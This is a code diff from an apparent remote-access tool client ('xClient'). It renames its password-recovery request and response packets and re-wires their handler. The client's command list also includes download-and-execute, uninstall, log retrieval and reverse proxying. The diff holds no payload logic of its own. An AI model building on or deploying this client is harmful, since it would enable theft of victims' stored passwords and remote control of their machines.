@@ -54,7 +54,7 @@ namespace xClient
 
             ConnectClient.AddTypesToSerializer(typeof (IPacket), new Type[]
             {
-                typeof (Core.Packets.ServerPackets.InitializeCommand),
+                               typeof (Core.Packets.ServerPackets.InitializeCommand),
                 typeof (Core.Packets.ServerPackets.Disconnect),
                 typeof (Core.Packets.ServerPackets.Reconnect),
                 typeof (Core.Packets.ServerPackets.Uninstall),
@@ -82,8 +82,6 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.RemoveStartupItem),
                 typeof (Core.Packets.ServerPackets.DownloadFileCanceled),
                 typeof (Core.Packets.ServerPackets.GetLogs),
-                typeof (Core.Packets.ServerPackets.PasswordRequest),
-                typeof (Core.Packets.ClientPackets.PasswordResponse),
                 typeof (Core.Packets.ClientPackets.Initialize),
                 typeof (Core.Packets.ClientPackets.Status),
                 typeof (Core.Packets.ClientPackets.UserStatus),
@@ -100,7 +98,9 @@ namespace xClient
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyData),
-                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect)
+                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect),
+                typeof (Core.Packets.ClientPackets.RecoverPassResponse),
+                typeof (Core.Packets.ServerPackets.RecoverPassRequest),
             });
 
             ConnectClient.ClientState += ClientState;
@@ -230,14 +230,9 @@ namespace xClient
         private static void ClientRead(Client client, IPacket packet)
         {
             var type = packet.GetType();
-
             if (type == typeof (Core.Packets.ServerPackets.InitializeCommand))
             {
                 CommandHandler.HandleInitializeCommand((Core.Packets.ServerPackets.InitializeCommand) packet, client);
-            }
-            else if (type == typeof(Core.Packets.ServerPackets.PasswordRequest))
-            {
-                CommandHandler.HandlePasswordRequest((Core.Packets.ServerPackets.PasswordRequest)packet, client);
             }
             else if (type == typeof(Core.Packets.ServerPackets.DownloadAndExecute))
             {
@@ -344,6 +339,10 @@ namespace xClient
             {
                 CommandHandler.HandleDownloadFileCanceled((Core.Packets.ServerPackets.DownloadFileCanceled)packet,
                     client);
+            }
+            else if (type == typeof(Core.Packets.ServerPackets.RecoverPassRequest))
+            {
+                CommandHandler.HandlePasswordRequest((Core.Packets.ServerPackets.RecoverPassRequest)packet, client);
             }
             else if (type == typeof(Core.Packets.ServerPackets.GetLogs))
             {
